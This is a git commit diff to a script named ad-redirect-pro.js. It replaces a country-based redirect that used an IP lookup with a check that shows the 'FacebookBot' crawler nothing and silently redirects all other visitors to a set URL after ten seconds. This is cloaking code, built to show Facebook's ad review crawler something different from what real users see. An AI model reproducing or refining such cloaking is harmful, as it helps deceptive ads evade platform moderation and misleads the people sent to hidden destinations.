7b5590bf79bc0327871bcf26e1f67ee60b486595
theafolayan <theafolayan@gmail.com>
2021-08-05 09:27:50 +0100

    added facebook botfilter

--- ad-redirect-pro.js
+++ ad-redirect-pro.js
@@ -1,33 +1,19 @@
 ( function() {
     var vm = new Vue({
       el: document.querySelector('#mount'),
-      data: {
-          country :'',
-
-      },
       mounted: function(){
           const url = document.getElementById('kofem-media-url').value;
-          const api = 'http://ipinfo.io/json';
-          fetch(api).then((response)=>{
-            return response.json()
-            }).then((data)=>{
-              this.country = data.country;
-              console.log(this.country);
-              if(this.country == 'USA'){
-                console.log('From USA');
-            }else{
-                console.log(this.country)
-                setTimeout( function(){
-                    window.location = url;
-                }, 10000);
-    
-            }
-            });
-        // console.log(url);
+          const userAgent = window.navigator.userAgent;
+          if(userAgent.includes('FacebookBot')){
+            console.log('Na Facebook Bot o!');
+        }else{
+            setTimeout( function(){
+                localStorage.setItem('kofem-visited', 'true');
+                window.location = url;
+            }, 10000);
 
-        // console.log()
+        }
         
-      
       }
     });
   })();
